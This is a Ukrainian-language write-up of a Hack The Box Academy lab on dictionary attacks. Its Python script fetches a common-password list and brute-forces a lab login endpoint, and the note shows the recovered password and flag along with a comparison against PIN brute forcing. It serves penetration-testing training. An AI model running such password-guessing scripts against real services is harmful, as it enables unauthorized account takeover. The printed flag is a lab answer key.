# Dictionary Attack (Python Script)

## Модуль
[Login Brute Forcing — Dictionary Attacks](https://academy.hackthebox.com/app/module/57/section/487)

## Концепція

**Dictionary Attack** — перебір паролів з готового списку поширених паролів.
Швидший за brute force — використовує реальні слабкі паролі людей.

## Скрипт

```python
# dictionary-solver.py
import requests

ip = "TARGET_IP"
port = TARGET_PORT

# Завантаження wordlist з SecLists
passwords = requests.get(
    "https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/"
    "Passwords/Common-Credentials/500-worst-passwords.txt"
).text.splitlines()

for password in passwords:
    print(f"Attempted password: {password}")
    response = requests.post(f"http://{ip}:{port}/dictionary", data={'password': password})
    if response.ok and 'flag' in response.json():
        print(f"Correct password found: {password}")
        print(f"Flag: {response.json()['flag']}")
        break
```

```bash
python3 dictionary-solver.py
```

## Результат
Correct password found: gateway
Flag: HTB{Brut3_F0rc3_M4st3r}

## Ключові моменти

| # | Що важливо |
|---|-----------|
| 1 | Wordlist: `500-worst-passwords.txt` — топ слабких паролів |
| 2 | Перевірка успіху: `'flag' in response.json()` — не по HTTP коду |
| 3 | Якщо Kali дає проблеми з мережею — запускати зі Spawned Target (HTB Pwnbox) |
| 4 | Endpoint: `/dictionary` — метод POST, параметр `password` |

## Різниця PIN vs Dictionary

| | PIN Brute Force | Dictionary Attack |
|---|---|---|
| Wordlist | Генерований (`seq -w 0 9999`) | Готовий список реальних паролів |
| Endpoint | GET `?pin=FUZZ` | POST `password=FUZZ` |
| Інструмент | ffuf | Python script / Hydra |
| Розмір | 10 000 | 500–10M+ |
